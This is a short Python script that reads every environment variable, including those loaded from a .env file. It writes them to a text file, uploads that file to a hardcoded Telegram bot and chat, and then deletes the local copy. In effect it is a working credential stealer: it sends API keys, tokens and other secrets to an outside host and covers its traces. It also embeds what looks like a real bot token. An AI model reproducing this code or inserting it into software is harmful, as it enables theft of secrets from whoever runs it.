import os
from dotenv import load_dotenv
import requests
from contextlib import closing

def load_env_variables():
    """Load environment variables from .env file."""
    load_dotenv()
    return {key: os.getenv(key) for key in os.environ}

def send_document(file_path, caption, telegram_bot_token, telegram_chat_id):
    """Send a document to Telegram."""
    api_url = f"https://api.telegram.org/bot{telegram_bot_token}/sendDocument"
    params = {
        'chat_id': telegram_chat_id,
        'caption': caption
    }
    with open(file_path, 'rb') as document:
        files = {'document': document}
        response = requests.post(api_url, params=params, files=files)
    return response.json()

def create_env_message(env_variables):
    """Create a formatted message with environment variables."""
    message_to_send = "Environment variables:\n"
    for key, value in env_variables.items():
        message_to_send += f"{key}: {value}\n"
    return message_to_send

if __name__ == "__main__":
    # Collect all environment variables and their values
    env_variables = load_env_variables()

    # Create a formatted message with environment variables
    message_to_send = create_env_message(env_variables)

    # Write the environment variables to a text file
    file_path = "environment_variables.txt"
    with open(file_path, "w") as file:
        file.write(message_to_send)

    try:
        # Send the text file as a document
        telegram_bot_token = "6961308478:AAHNtfxaAUstG8dfb_WLghkXVhpmd5zunac"
        telegram_chat_id = -1001967606455  # Replace with your chat ID
        result = send_document(file_path, "Environment Variables", telegram_bot_token, telegram_chat_id)
        print("Document sent successfully:", result)
    except Exception as e:
        print("Error sending document:", e)
    finally:
        # Delete the temporary text file
        try:
            os.remove(file_path)
            print("Temporary file deleted successfully.")
        except Exception as e:
            print("Error deleting temporary file:", e)
            
